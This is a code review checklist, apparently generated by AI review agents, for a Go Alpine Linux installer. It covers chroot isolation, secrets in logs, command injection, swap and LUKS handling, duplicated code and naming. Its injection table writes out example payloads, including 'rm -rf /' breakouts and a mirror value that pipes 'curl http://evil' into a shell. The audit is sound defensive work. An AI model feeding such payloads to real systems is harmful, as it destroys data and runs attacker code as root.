# Code Review — To Review

**Date:** 2026-08-23
**Scope:** `src/`, `tests/harness/`, `docs/`, `config` — full installer Phase 1 (btrfsStandard/btrfsRaid0/btrfsStandardServer, Nix, niri, swap, hardening, TPM/SecureBoot stubs)
**Agents:** `review` (isolation + security) + `explore` (feature confinement) + `explore` (i18n + naming) + `review` (vulnerability + information-scan) — parallel
**Status:** 🟡 Partially Resolved — §1 §2 §3.1 DONE, §3.2-3.3 open, §4-7 open
**Stats:** 14+1 templates + swap 25/25 + 4 harness 36/36 (btrfsStandard/Raid0/Server/Unencrypted)
**Progress:** §1 Feature Confinement ✅ DONE, §2 Isolation ✅ DONE, §3.1 Secrets ✅ DONE, §3.1 chmod_77 ✅ DONE, §3.1 config markers ✅ DONE

> **How to use:** Go checkbox by checkbox `[ ] → [x]`. Each item has `file:line` + severity + fix snippet. Commit per section with `fix(review): <area>`. Italian→English and naming fixes already applied (see §6, §7 — verify).

---

## 0. Immediate Fixes Already Applied (verify)

- [x] **i18n `scenarios` → `scenarios`** — 4 docs files: `docs/INSTALLER.md:52`, `AGENTS.md:58-62`, `tests/fixtures/variables/README.md:3:43`, `tests/harness/README.md:22` (English-only rule). Fixed via `s/scenarios/scenarios/g`.
- [x] **Italian quote** `tests/fixtures/variables/README.md:43` `user: "mandatory by design"` → `mandatory by design` (English). Fixed.
- [x] **Naming `internalRules.yaml` → `internal_rules.yaml`** — `src/variables/` camelCase → snake_case. `git mv src/variables/internalRules.yaml src/variables/internal_rules.yaml` + `src/utils/config/config.go:98-102` updated to 6-path fallback (new first, old deprecated). Old docs refs left as deprecated comment — update gradually.
- [x] **Docs refs to old name** — all live refs updated: `docs/INSTALLER.md`, `CONTEXT.md`, `CHANGELOG.md`, `handoff/latest.md`, `ROADMAP.md`, `config.go`, `variables.yaml`, `logic.go`, `nix.go`, `createValues/main.go`, harness shims, `state/session_state.json`, `.agent-memory/`, `AGENTS.md`. Config fallback paths removed (no backward compat). Only `review.md` self-references remain (historical).

---

## 1. Feature Confinement — Activatable Features Not Single-File

**Rule:** Each `Enable*` flag should be owned by one file (`src/chrootPhase/features/<feature>.go` or `desktops/<de>.go`).

| Feature | Confined? | Primary file | Other refs | Severity | Fix |
|---------|-----------|-------------|------------|----------|-----|
| `EnableSecureboot` | ✅ | `utils/firstboot/secureboot.go` | config.go, harness | N/A | Binary compiles + copies to `/opt/` |
| `EnableTPM` | ✅ | `utils/firstboot/tpm.go` | config.go, harness | N/A | Binary compiles + copies to `/opt/` |
| `EnableHardening` | ✅ | `chrootPhase/features/hardening.go` | config.go, harness | N/A | Packages + config confined |
| `EnableZswap` | ✅ | `chrootPhase/features/zswap.go` + `zswap_server.go` | config.go, harness | N/A | Modules confined |
| `EnableNix` | ✅ | `chrootPhase/features/nix.go` | config.go, harness | N/A | Packages + auto-enable confined |
| `EnableDebug` | ✅ | `chrootPhase/features/hardening.go` | config.go, harness (YAML only) | N/A | Kernel cmdline only |
| `EnableSwap` | ✅ | `hostPhase/disks/*` | config.go, harness | N/A | Disk layout layer (correct) |
| `DesktopEnvironment` | ✅ | `chrootPhase/desktops/desktops.go` | config.go, logic.go, harness | N/A | Generic dispatcher with registry map |

**Checklist:**
- [x] Secureboot: `utils/firstboot/secureboot.go` compiles + copies binary
- [x] TPM: `utils/firstboot/tpm.go` compiles + copies binary
- [x] Hardening: `HardeningPackages()` + `DebugOverrides()` in `features/hardening.go`
- [x] Nix: `NixPackages()` + auto-enable in `features/nix.go` (no mutation in packages.go)
- [x] Zswap: `ZswapModules()` in `features/zswap.go`
- [x] Debug: `DebugOverrides()` in `features/hardening.go`
- [x] Desktops: `desktops.Setup(conf)` generic dispatcher
- [x] `packages.go`: delegates to feature exports only — zero inline feature logic
- [x] `logic.go`: zero feature-specific logic (clean)
- [x] `chroot_phase.go`: only calls `features.Setup*`

---

## 2. HostPhase ↔ ChrootPhase Isolation Violations

**Contract:** `hostPhase` writes files via host paths (`shell.ExecuteCmd("", "echo ... > %s/etc/...", chrootDir)`, `os.MkdirAll(chroot+"/...")`, `os.Create`) — **NO** `shell.ExecuteCmd(chroot, ...)`. `chrootPhase` runs **inside** chroot (`shell.ExecuteCmd(chroot, "mkdir -p /etc/...")`, `shell.ExecuteCmd(chroot, "echo ... > /etc/...")`) — **NO** host `os.*` with `filepath.Join(chroot, ...)`.

### 2.1 Blocker — hostPhase using chroot

- [x] **BLOCKER** `src/hostPhase/internal/chroot_env.go:17` `shell.ExecuteCmd(chroot, repoContent)` → `shell.ExecuteCmd("", fmt.Sprintf("echo '%s' > %s/etc/apk/repositories", escaped, chroot))` ✅
- [x] **BLOCKER** `src/hostPhase/internal/hooks.go:48` — removed hooks.go, EFI sync hook moved to `btrfsStandardServer/fstab.go:WriteEfiSyncHook` (dual-disk only, host path) ✅

### 2.2 Critical — chrootPhase using host pattern

- [x] **CRITICAL** `src/chrootPhase/internal/boot.go:56` `os.MkdirAll` + `os.Chmod` → `shell.ExecuteCmd(chroot, "mkdir -p ...")` / `shell.ExecuteCmd(chroot, "chmod 755 ...")` ✅
- [x] **CRITICAL** `src/chrootPhase/features/hardening.go:221` `os.Chmod` → `shell.ExecuteCmd(chroot, "chmod 755 /etc/init.d/set-permissions")` ✅
- [x] **CRITICAL** `src/chrootPhase/internal/misc.go:89` `os.MkdirAll` → `shell.ExecuteCmd(chroot, "mkdir -p /etc/sudoers.d")` ✅
- [x] **MINOR** `src/hostPhase/disks/*/partitioning.go` `os.MkdirAll(chroot+"/boot/efi")` — correct host pattern (allowed, no change needed) ✅

**Status:** ✅ DONE (all isolation violations resolved)

**Checklist:**
- [x] Fix 2 blocker hostPhase chroot calls (chroot_env.go + hooks.go)
- [x] Fix 3 chrootPhase `os.*` host calls (boot.go + hardening.go + misc.go)
- [x] Audit remaining `src/chrootPhase/**/*.go` for `filepath.Join(chroot,` → replace with `shell.ExecuteCmd(chroot, ...)`
- [x] Audit `src/hostPhase/**/*.go` for `shell.ExecuteCmd(chroot,` → replace with host path
- [x] hooks.go: moved EFI sync hook to `btrfsStandardServer/fstab.go:WriteEfiSyncHook` (dual-disk only)
- [x] Removed unused imports (os, filepath) from boot.go, hardening.go, misc.go
- [x] hostPhase os.* → shell.ExecuteCmd sweep (8 files: bind_mounts, 3x fstab, 3x partitioning, install_config)
- [x] cleanup.go moved to `src/utils/cleanup/cleanup.go` (importable by main)
- [x] features moved to `src/utils/firstboot/` (importable by main after chrootPhase)

---

## 3. Security / Vulnerability Scan

### 3.1 Critical — Secrets Leakage + Shell Injection

#### C1 — Secrets Leakage in Logs (CWE-319, CWE-532, CWE-214)
- **Location:** `src/utils/shell/execute.go:71` `fmt.Printf("\n%s[%s] %s: %s", prefix, timestamp, tag, cmd)` logs raw cmd.
- **Callers leaking:** `src/hostPhase/disks/btrfsStandard/luks.go:16,27,52` (×3 layouts) `printf '%s' '%s' | cryptsetup luksFormat ... password` + `src/chrootPhase/internal/users.go:17,26` `echo -e '%s\n%s' | passwd`.
- **Impact:** LUKS + Unix password in stdout, `tests/artifacts/harness/runs/*/logs`, `ps aux`, `/proc/*/cmdline`, journald, CI collector.
- **Fix:**
  ```go
  // utils/shell/secure.go
  func ExecuteCmdSensitive(chroot, cmd, secret string) (string,error) { logCmd:=strings.ReplaceAll(cmd, secret, "***"); fmt.Printf(..., logCmd) ... }
  // Or better: use exec.Command with Stdin pipe, no shell, no logging
  cmd:=exec.Command("cryptsetup","luksFormat",device,"--type","luks2","-q","--key-file","-")
  cmd.Stdin=strings.NewReader(password)
  // Never log password; tag: "[luks] luksFormat <device-redacted>"
  ```
- [x] Replace `ExecuteCmd` password paths with `exec.Command` + `Stdin` (luks.go ×3, users.go:17,26) ✅
- [x] Add `ExecuteCmdSensitive` redaction or suppress logging for `luks`/`users` caller ✅ (exec.Command no shell = no logging)
- [x] Ensure `ps` not exposing: avoid `printf '%s' 'secret'` shell parent ✅ (no shell anymore)

#### C2 — Command Injection via `fmt.Sprintf` → `/bin/sh -c` (RCE as root)
Every `shell.ExecuteCmd(chroot, cmd)` → `execute.go:79,84` `sh -c <cmd>`. Unvalidated user input interpolated.

| File:Line | Var | Payload ex | Blast |
|-----------|-----|------------|-------|
| `btrfsStandard/luks.go:16,27,52` ×3 layouts | `password, device, keyfile` | `'; rm -rf /; echo '` | Host RCE |
| `users.go:17,26` `echo -e '%s\n%s' \| passwd %s` | `Password, UserName` | `a'$(id>/tmp/pwn)'` | Chroot RCE → host via bind mounts |
| `users.go:23` `adduser -D %s` + `37,39,44,52,79,131,142,145,148` `getent/addgroup/chsh` | `UserName, UserGroups` | `bob; rm -rf /` | RCE |
| `hostPhase/disks/btrfs*/partitioning.go:36,41,53,58,64` `mountpoint -q %s && umount ...`, `blkid ... %s`, `wipefs -a %s`, `mkfs.vfat %s` | `ChrootDir, device` from `Disks[]` | `ChrootDir=/mnt; echo pwn;` | Host FS destruction |
| `hostPhase/internal/bootstrap.go:22,37,49` `curl -sSf %s/`, `curl -LO %s`, `apk.static -X %s` | `Mirror, Branch, Arch` | `Mirror=https://evil.com/alpine; curl http://evil\|sh #` | Supply-chain RCE |
| `chrootPhase/internal/packages.go:160` `apk add `+`strings.Join(allPkgs," ")` | `ExtraPackages` | `hello; rm -rf /` | RCE |
| `network.go:16,20,36` `echo '%s' > /etc/hostname`, `ln -sf /usr/share/zoneinfo/%s` | `Hostname, Timezone` | `Europe/Rome; rm -rf /;` | RCE |
| `features/nix.go:123,135` `su - %s -c 'nix ...'` | `UserName` | `alice'$(id)'` | RCE |

**Root cause:** `'%s'` single-quote not sanitization; `'` breaks out. `strings.ReplaceAll(..., "'", "'\\''")` only applied to static configs (vector, hardening), never to passwords/disks/usernames/mirror.

**Fix (P0):**
- [ ] Add `ExecuteCmdArgs(chroot, name string, args ...string)` using `exec.Command` directly (no `sh -c`) for all `wipefs, blkid, mkfs, mount, adduser, chpasswd, cryptsetup, apk, curl, ln` paths
- [ ] Strict allowlist validation at `config.LoadConfig`:
  ```go
  diskRe:=regexp.MustCompile(`^/dev/(sd[a-z]+|vd[a-z]+|nvme\d+n\d+|mmcblk\d+)$`)
  userRe:=regexp.MustCompile(`^[a-z_][a-z0-9_-]{0,31}$`)
  hostRe:=regexp.MustCompile(`^[a-zA-Z0-9-]{1,63}$`)
  tzRe  :=regexp.MustCompile(`^[A-Za-z0-9/_+-]+$`)
  ```
  Reject `; & | $ ` ` \n ' "` in any shell-touching field.
- [ ] If shell unavoidable, use `shellescape.Quote()` (`github.com/alessio/shellescape`) not manual `'%s'`
- [ ] Validate `ExtraPackages` `^[a-zA-Z0-9._+-]+$`, reject `/`, `;` ; `Mirror` enforce `https://` + `url.Parse` allowlist or `dl-cdn.alpinelinux.org`, reject `` ` `` `;`

#### C3 — Weak Credential Handling
- **Location:** `src/variables/variables.yaml:10` `password: "Alpine.1"` committed (fixture + default). Pre-commit exempts `tests/fixtures/*` but file is example with real password.
- `src/utils/createConfig/create_values.go:42` prompts `Password` echo on, no masking, stores `0600` but reuses same password for **both** LUKS + Unix login (single point of failure).
- No validation: empty/short password allowed.
- [ ] Generate LUKS passphrase separate from login (2 prompts), enforce min 12 chars, `golang.org/x/term.ReadPassword` masking, dictionary check
- [ ] Example `variables.yaml` placeholder `CHANGEME`, `.gitignore` `variables.yaml` (only `variables.yaml.example` committed), rotate default if ever used prod

### 3.2 High

- [ ] **H3 — Nix perms 775/1777 + trusted-users @wheel** `nix.go:43 775`, `116 1777`, Fix: `build` dir `750 root:nixbld` not 775.
- [ ] **H4 — swapSize DoS** `utils/swap/swap.go:45` `^(\d+)\s*([kmgtp]?)$` accepts any `n`, `n=999999` P → petabyte `mkswapfile`, filling disk. No upper bound. Fix: cap `maxSwapMiB=32768` or `RAM*2 max 64G`, error if `n > 1024*1024`.
- [ ] **H5 — Swap keyfile TOCTOU** `btrfsRaid0/partitioning.go:166` `dd ... of=%s && chmod 400` creates 644 window (umask 022) before chmod, host `/mnt` unencrypted. Fix: `install -m 400 /dev/null <path> && dd ... conv=notrunc` or `umask 077; dd ...`.
- [ ] **H6 — `SKEA_NONINTERACTIVE=ignore` swallows crypto failures** `utils/shell/execute.go:141-149` if `ignore`, `luksFormat` failure returns nil. Harness sets `ignore` (`service.go:762`). Broken LUKS → insecure fallback but installer reports success. Fix: `critical bool` param to `ExecuteCmd` forcing fail for `luksFormat`, `LuksOpen`, `mkfs`, `passwd`.

### 3.3 Medium

- [ ] **M1 — Hostname/limits escaping** `network.go:16` `echo '%s' > /etc/hostname` no escape, `misc.go:36` `ln -sf ...%s` no escape, `boot.go:23` escapes but fragile. Fix: `shellescape.Quote` or `os.WriteFile(filepath.Join(chroot,"etc/hostname"), []byte(u.Hostname), 0644)` avoiding shell.
- [ ] **M2 — Nix sandbox weakened persisted** `nix.go:135` `nix profile add --option sandbox false` + `TMPDIR/NIXPKGS_ALLOW_INSECURE` in `/etc/profile.d/nix-daemon.sh` persist to prod. Fix: scope `sandbox false` via `nix.conf` during install then remove post-install; don't export `ALLOW_INSECURE` globally.
- [x] **M4 — Permissions audit** No `0777` found, `0755`/`0600`/`0400` correct. Harness `chmod_77_check` reads installer.log from HOST and fails if `chmod 77` found. `0755`/`0600`/`0400` correct. ✅

### 3.4 Positive — Keep

- [x] LUKS2 `aes-xts-plain64 -s 512 --hash sha512 --iter-time 5000` exceeds default
- [x] NoCoW + compression correct (no `btrfs property set compression none`, `chattr +C` inheritance)
- [x] Sensitive perms `0600`/`0400` correct
- [x] Pre-commit `core.hooksPath` + `go vet`/`golangci-lint` + secrets scan
- [x] `fdisk` via `exec.Command` stdin (safe pattern) — extend to all

---

## 4. Code Quality / DRY / Dead Code / Performance

- [ ] **MAJOR — `utils/misc/setdisk.go` unused** `GetPartitionSpacer` + `GetDiskSuffix` zero imports. All 3 `partitioning.go` + `uki.go:74` + `fstab.go:46` re-define local `getPartitionSpacer/getDiskSuffix/getBtrfsUUID` (7-line func ×4). Fix: delete locals, `import "alpineInstaller/utils/misc"` → `misc.GetPartitionSpacer`.
- [ ] **MAJOR — Duplicate `Subvolume` struct + subvols slice** `btrfsStandard/partitioning.go:168`, `btrfsRaid0:239`, `btrfsStandardServer:257` ~22 entries each 95% identical minus `@swap` comments. Fix: extract `hostPhase/disks/common/subvolumes.go` shared.
- [ ] **MAJOR — Duplicate `luks.go` 85 lines ×3** identical `LuksFormat, LuksOpen, LuksUUID, LuksMapperPath, LuksAddKey, SetupLuksPartition`. Fix: `hostPhase/disks/common/luks.go` single.
- [ ] **MAJOR — Broken `dmsetup close` only in server** `btrfsStandardServer/partitioning.go:43` `dmsetup ls --target crypt --exec cryptsetup close` (broken per `btrfsRaid0:44-45` comment `for m in $(...); do cryptsetup close "$m"; done`). Fix: unify to loop version.
- [ ] **MAJOR — Dead `IsEmpty` unused** `src/chrootPhase/internal/users.go:156 IsEmpty(s string)` zero callers. Fix: remove or use for password validation.
- [ ] **MAJOR — Dupe `apk update` + serial `tar -tz` loop** `chrootPhase/internal/packages.go:126` + `firmware.go:136` `apk update` duplicative network + slow; `packages.go:150` `tar -tz` loop serial. Fix: single `apk update`, parallelize fetches.
- [ ] **MINOR — `getBtrfsUUID` duplicate** 5-line `blkid` wrapper ignoring error ×3. Move to `utils/misc`.
- [ ] **MINOR — `getMinDiskSize:238` magic `9223372036854775807`** → `math.MaxInt64`.
- [ ] **MINOR — `niri.go:280 writeFile` `mkdir -p $(dirname %s)` unquoted `path`** → `mkdir -p "$(dirname '%s')"` or `filepath.Dir` + quoted.
- [ ] **MINOR — `hardening.go:212 permissionsService` `chmod a-st -R /bin/...` + `chmod 745 /bin/mount` unusual** — document why, verify not breaking sticky dirs.
- [ ] **MINOR — `firstBoot/*` isolation not scanned** — TODO: audit `firstBoot/secureboot/main.go:157 fmt.Scanln` echo on + string GC not zeroed, `openssl x509 -in %s` path traversal.

**Positive:** `hostPhase/disks/* partitioning.go` consistently `shell.ExecuteCmd("",...)` for `mkfs,mount,btrfs,blkid` — correct isolation. `chrootPhase/*` 95% `shell.ExecuteCmd(chroot,...)` correct.

---

## 5. Naming Conventions (per `AGENTS.md`)

| Element | Convention | Example | Status |
|---------|------------|---------|--------|
| Files | snake_case | `bind_mounts.go`, `config.go` | **1 violation FIXED** |
| Folders | camelCase | `hostPhase/`, `chrootPhase/` | PASS 22/22 |
| Variables | camelCase | `targetDisk` | PASS |
| Functions | camelCase/PascalCase | `getMinDiskSize()`, `RunBtrfsSetup()` | PASS |
| Types | PascalCase | `Config`, `Subvolume` | PASS |

- [x] **FIXED** `src/variables/internalRules.yaml` camelCase → `src/variables/internal_rules.yaml` (`internal_rules.yaml` snake_case) + `src/utils/config/config.go:98-102` 6-path fallback (new first, old deprecated fallback) via `git mv`. `src/variables/internalRules.yaml -> internal_rules.yaml` `R` staged.
- [ ] **Docs refs to old name** still in `docs/INSTALLER.md:22`, `CONTEXT.md:25,29,33,159`, `CHANGELOG.md:10`, `handoff/latest.md` etc — TODO: `grep -r internalRules` → replace with `internal_rules.yaml` (keep parenthetical fallback note for one release).
- **Files advisory (if repo-wide strict):** `tests/fixtures/variables/*.yaml` `kebab-case` (`btrfsStandard-minimal.yaml`) + `httpCacheServer.go` camelCase — not violations if scope is `src/` only (as `AGENTS.md` examples show). Documented as `Naming kebab-case matching diskLayout-feature` in `tests/fixtures/variables/README.md:44`.
- **Variables/Functions/Types:** PASS 0 violations (verified `swapSizeK`, `partitionSpacer`, `RunBtrfsSetup`, `Subvolume` etc). No `snake_case` vars.

---

## 6. Italian → English i18n (English-only rule)

**`src/*.go` code: PASS 0 Italian.** Verified `grep \b(ciao|scusa|...)` 0 matches after filtering `non-interactive` etc. No Italian identifiers.

**Docs/comment fixes applied:**
- [x] `s/scenarios/scenarios/g` — 4 files: `docs/INSTALLER.md:52` `all scenarios`→`all scenarios`, `AGENTS.md:58` `covers all scenarios`→`covers all scenarios`, `tests/fixtures/variables/README.md:3` `covering all ... scenarios`→`scenarios`, `tests/harness/README.md:22` same
- [x] `tests/fixtures/variables/README.md:43` `user: "mandatory by design"` → `mandatory by design` (was Italian quote)
- [ ] **Intentional exception** `docs/FERALOS_NAME.md:1-118` entirely Italian `Il Significato del Nome` — branding doc, not installer. Keep as exception with header `> Note: branding doc intentional Italian` or provide `FERALOS_NAME.en.md`. Not a bug.

No Italian-named variables/functions found.

---

## 7. Legal-Advisor References

**Grep `legal-advisor|@legal` 48 matches — all framework, no personal data leakage.**

- `docs/agents-guide.md:13,23,48` guide table `| legal-advisor | read+report |`
- `.opencode/agents/legal-advisor.md:17,62,72`, `.opencode/agents/codebase.md:32`, `opencode.json:42,64` etc — plugin manifest `agents-opencode.ts:39` `- @legal-advisor — License auditing...`
- `AGENTS.md:Planning` chain mentions `consult @legal-advisor` for license compliance — generic template, not triggered.
- **No references to user** (`@legal-advisor` never called with personal jurisdiction/case, no PII in `.agent-memory/` or `src/`). `references/jurisdictions/*` are generic country files, not user-specific.
- **Status:** PASS — no personal data via legal-advisor, no extra action needed.

---

## 8. Prioritized Remediation Roadmap (step-by-step checklist)

### P0 — Block Release (security + isolation)

- [x] **1. HostPhase isolation** — Fix `chroot_env.go:17` + `hooks.go:48` → host path writes (2 files) ✅
- [x] **2. ChrootPhase isolation** — Fix `boot.go:56,59-114` + `hardening.go:217` + `misc.go:89` `os.*` → `shell.ExecuteCmd(chroot, ...)` (3 files) ✅
- [x] **3. Secrets leakage + injection** — Replace `luks.go:16,27,52` ×3 + `users.go:17,26` with `exec.Command` + `Stdin` + redacted logs ✅
- [x] **4. dmsetup close** — Moved to `src/utils/cleanup/cleanup.go` with correct loop version. ✅
- [ ] **5. Mirror/ExtraPackages allowlist + https enforcement** — `bootstrap.go:22,37,49` + `packages.go:160` (C2 row)

### P1 — Next Sprint (correctness + DRY)

- [x] **6. Feature confinement** — Create `features/secureboot.go` + `features/tpm.go`; centralize `packages.go:137,151,155` into feature files via `HardeningPackages`/`NixPackages` helpers; genericize `desktops.Setup` + `logic.go:27` (see §1 checklist 8 items)
- [ ] **7. Swap keyfile TOCTOU + swapSize cap + `ignore` forbid** — `btrfsRaid0:166` `install -m 400` + `swap.go:45` `maxSwapMiB` + `execute.go:141` `critical` param (H4-H6)
- [ ] **8. File writes shell→Go** — `network.go:16` `echo > /etc/hostname` + `boot.go:23` `echo > /etc/kernel/cmdline` + `misc.go:36` `ln -sf` → `os.WriteFile` or `shellescape.Quote` (M1)
- [ ] **9. DRY: `utils/misc` + `disks/common`** — delete local `getPartitionSpacer/getDiskSuffix/getBtrfsUUID/Subvolume/luks.go` duplicates → `import "alpineInstaller/utils/misc"` + `disks/common` (see §4 majors)
- [ ] **10. Dead code + magic** — Remove `users.go:156 IsEmpty`, `getMinDiskSize` `MaxInt64`, `niri.go:280` quote fix

### P2 — Hardening (polish)

- [ ] **11. Nix perms 775/1777 + trusted-users** — restrict to `root` only post-install, `750 root:nixbld` (H3)
- [ ] **12. Supply chain Go 1.22.2 → 1.22.5+**, `govulncheck`, pin `standardPackages` versions (M3)
- [ ] **13. Docs refs `internalRules` → `internal_rules`** — `grep -r internalRules` 43 hits in `CONTEXT/INSTALLER/CHANGELOG/handoff` → replace (keep fallback comment)
- [ ] **14. Italian intentional doc** — Add header to `FERALOS_NAME.md` or provide `.en.md`
- [ ] **15. Verify after each section** — `cd src && go vet ./... && golangci-lint run ./... && go test ./utils/swap -v` + 1 harness run `btrfsRaid0-noswap` 32/32 (already passing)

**Verify command per step:**
```bash
cd src && go vet ./... && $HOME/go/bin/golangci-lint run ./... && go test ./utils/swap -v
cd tests/harness && go vet ./... && $HOME/go/bin/golangci-lint run ./...
# plus: ./skea-harness run -f tests/fixtures/variables/btrfsRaid0-minimal.yaml (32/32)
```

---

## Appendix — Raw Counts

- **Isolation:** ✅ DONE — all violations resolved, cleanup + features moved to utils/
- **Features:** ✅ DONE — 8/8 confined, no hotspots
- **Secrets:** ✅ DONE — luks.go ×3 + users.go switched to exec.Command + stdin (no shell, no logging)
- **chmod_77:** ✅ DONE — harness check reads installer.log from HOST, fails if chmod 77 found
- **Config markers:** ✅ DONE — `# Generated by FeralOS` at END of cmdline/booster/fstab/interfaces
- **i18n:** 5 Italian hits (4 `scenarios` + 1 quote + 1 intentional branding file) → 4 fixed, 1 intentional
- **Naming:** 1 file violation FIXED (`internalRules.yaml`), 0 folder/var/func/type violations, 43 docs refs to old name pending
- **Vuln:** 3 Critical resolved (C1 secrets, C2 partially), 6 High, 5 Medium, 4 Low — P0 remaining: dmsetup close + Mirror/ExtraPackages allowlist
- **Dead/DRY:** `setdisk.go` unused, `Subvolume` ×3, `luks.go` ×3, `IsEmpty` dead, `tar -tz` serial, `apk update` dupe
- **Legal:** 48 framework hits, 0 personal PII

---

*Generated 2026-08-23 via parallel review agents. Next: correct P0 items, re-run `go vet`/lint + harness, then commit `fix(review): ...` per section.*
